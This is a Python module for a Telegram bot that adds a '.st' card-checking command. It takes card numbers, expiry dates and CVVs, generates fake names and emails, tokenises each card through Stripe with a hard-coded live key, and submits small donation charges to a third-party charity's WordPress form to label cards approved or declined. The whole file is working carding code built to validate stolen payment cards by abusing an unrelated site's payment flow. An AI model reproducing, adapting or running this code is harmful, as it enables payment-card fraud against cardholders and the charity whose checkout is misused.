import re
import time
import random
import string
from datetime import datetime
import httpx
from pyrogram import Client, filters
import logging
from EQUROBOT import app

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

#
VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')

@app.on_message(filters.command('st', prefixes='.'))
async def st_charge(client, message):
    try:
        cc = message.text[len('.st '):]
        if message.reply_to_message:
            cc = message.reply_to_message.text
        x = re.findall(r'\d+', cc)
        ccn, mm, yy, cvv = x[0], x[1], x[2], x[3]

        if not ccn.startswith(VALID):
            await message.reply_text('**Invalid CC Type**')
            return

        start = time.time()

        letters = string.ascii_lowercase
        First = ''.join(random.choice(letters) for _ in range(6))
        Last = ''.join(random.choice(letters) for _ in range(6))
        Name = f'{First}+{Last}'
        Email = f'{First}.{Last}@gmail.com'

        async with httpx.AsyncClient() as client:
            headers = {
                "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
                "accept": "application/json, text/plain, */*",
                "content-type": "application/x-www-form-urlencoded"
            }
            r = await client.post('https://m.stripe.com/6', headers=headers)
            Muid = r.json().get('muid')
            Sid = r.json().get('sid')
            Guid = r.json().get('guid')

            payload = {
                "guid": Guid,
                "muid": Muid,
                "sid": Sid,
                "key": "pk_live_RhohJY61ihLIp0HRdJaZj8vj",
                "card[name]": Name,
                "card[number]": ccn,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "card[cvc]": cvv
            }
            head = {
                "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
                "content-type": "application/x-www-form-urlencoded",
                "accept": "application/json",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "accept-language": "en-US,en;q=0.9"
            }

            resq = await client.post('https://api.stripe.com/v1/tokens', data=payload, headers=head)
            resq_data = resq.json()
            Id = resq_data.get('id')
            Country = resq_data.get('card', {}).get('country')
            Brand = resq_data.get('card', {}).get('brand')

            load = {
                "action": "wp_full_stripe_payment_charge",
                "formName": "Donate",
                "fullstripe_name": Name,
                "fullstripe_email": Email,
                "fullstripe_custom_amount": 1,
                "stripeToken": Id
            }
            header = {
                "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "accept": "application/json, text/javascript, */*; q=0.01",
                "accept-language": "en-US,en;q=0.9"
            }
            cookie = {'stripe_mid': Muid, 'stripe_sid': Sid}
            req = await client.post('https://www.breslov.info/wp-admin/admin-ajax.php', data=load, headers=header, cookies=cookie)
            msg = req.json().get("msg")
            end = time.time()

            if 'security code is' in req.text:
                response = (
                    f'┏━━━━━━━⍟\n'
                    + f'┃#APPROVED 𝟓$ ✅\n'
                    + f'┗━━━━━━━━━━━⊛\n'
                    + f'CARD:- {ccn}|{mm}|{yy}|{cvv}\n'
                    + f'RESPONSE:- {msg}\n'
                )
            elif "true" in req.text:
                response = (
                    f'┏━━━━━━━⍟\n'
                    + f'┃#APPROVED 𝟓$ ✅\n'
                    + f'┗━━━━━━━━━━━⊛\n'
                    + f'CARD:- {ccn}|{mm}|{yy}|{cvv}\n'
                    + f'RESPONSE:- {msg}\n'
                )
            else:
                response = (
                    f'┏━━━━━━━⍟\n'
                    + f'┃# DECLINED ❌\n'
                    + f'┗━━━━━━━━━━━⊛\n'
                    + f'CARD:- {ccn}|{mm}|{yy}|{cvv}\n'
                    + f'RESPONSE:- {msg}\n'
                )
            await message.reply_text(response)

    except Exception as e:
        logger.error(f"Error occurred: {e}")
        await message.reply_text(f"An error occurred: {str(e)}")
